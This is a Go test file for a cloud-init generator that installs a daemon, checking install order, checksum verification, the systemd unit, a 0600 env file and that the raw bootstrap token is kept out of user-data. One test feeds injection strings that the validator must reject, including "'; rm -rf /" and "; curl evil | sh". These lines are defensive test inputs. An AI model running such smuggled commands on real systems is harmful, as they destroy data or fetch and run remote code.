package engine

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func testInstall() *DaemonInstall {
	return &DaemonInstall{
		Version:              "v1.54.0",
		SHA256:               strings.Repeat("a", 64),
		BootstrapTokenSHA256: strings.Repeat("b", 64),
		ServeFlags:           "--enable-apply --enable-edge-apply",
	}
}

func TestCloudInitInstallsTheDaemonAndStaysValidYAML(t *testing.T) {
	ud, err := GenerateCloudInitUserDataWith("ssh-ed25519 AAAA test", testInstall())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(ud, "#cloud-config\n") {
		t.Fatal("user-data must start with #cloud-config")
	}
	var doc struct {
		Runcmd     []string            `yaml:"runcmd"`
		WriteFiles []map[string]string `yaml:"write_files"`
		Packages   []string            `yaml:"packages"`
	}
	if err := yaml.Unmarshal([]byte(ud), &doc); err != nil {
		t.Fatalf("not valid YAML: %v\n%s", err, ud)
	}
	run := strings.Join(doc.Runcmd, "\n")
	inc := strings.Index(run, "apt-get install -y incus")
	dl := strings.Index(run, "releases/download/v1.54.0/native-ops_v1.54.0_linux_amd64.tar.gz")
	sum := strings.Index(run, strings.Repeat("a", 64)+"  /tmp/native-ops.tgz' | sha256sum -c -")
	inst := strings.Index(run, "install -m 0755")
	start := strings.Index(run, "systemctl enable --now native-ops-serve")
	if inc < 0 || dl < inc || sum < dl || inst < sum || start < inst {
		t.Fatalf("want incus, then download, checksum, install, start, in order:\n%s", run)
	}
	files := map[string]map[string]string{}
	for _, f := range doc.WriteFiles {
		files[f["path"]] = f
	}
	unit := files["/etc/systemd/system/native-ops-serve.service"]
	if !strings.Contains(unit["content"], "--state-dir /var/lib/native-ops --enable-apply --enable-edge-apply\n") ||
		!strings.Contains(unit["content"], "EnvironmentFile=-/etc/native-ops/serve.env") {
		t.Fatalf("unit:\n%s", unit["content"])
	}
	env := files["/etc/native-ops/serve.env"]
	if env["permissions"] != "0600" || !strings.Contains(env["content"], "NATIVE_OPS_BOOTSTRAP_TOKEN_SHA256="+strings.Repeat("b", 64)) {
		t.Fatalf("env file: %v", env)
	}
	if strings.Contains(env["content"], "NATIVE_OPS_BOOTSTRAP_TOKEN=") {
		t.Fatal("the token itself must never be in user-data")
	}
}

func TestCloudInitWithoutTheDaemonIsUnchanged(t *testing.T) {
	ud, err := GenerateCloudInitUserDataWith("ssh-ed25519 AAAA test", nil)
	if err != nil || ud != GenerateCloudInitUserData("ssh-ed25519 AAAA test") || strings.Contains(ud, "native-ops") {
		t.Fatalf("no daemon asked for, none installed: %v", err)
	}
}

func TestDaemonInstallRejectsUnsafeValues(t *testing.T) {
	for name, mut := range map[string]func(*DaemonInstall){
		"version":   func(d *DaemonInstall) { d.Version = "v1.0.0'; rm -rf /" },
		"sha":       func(d *DaemonInstall) { d.SHA256 = "abc" },
		"token":     func(d *DaemonInstall) { d.BootstrapTokenSHA256 = "nops_" + strings.Repeat("x", 64) },
		"flags":     func(d *DaemonInstall) { d.ServeFlags = "--x; curl evil | sh" },
		"arch":      func(d *DaemonInstall) { d.Arch = "mips" },
		"base url":  func(d *DaemonInstall) { d.ReleaseBase = "http://example.com" },
		"base url2": func(d *DaemonInstall) { d.ReleaseBase = "https://example.com/'x" },
	} {
		d := testInstall()
		mut(d)
		if _, err := GenerateCloudInitUserDataWith("k", d); err == nil {
			t.Errorf("%s: an unsafe value was accepted", name)
		}
	}
}
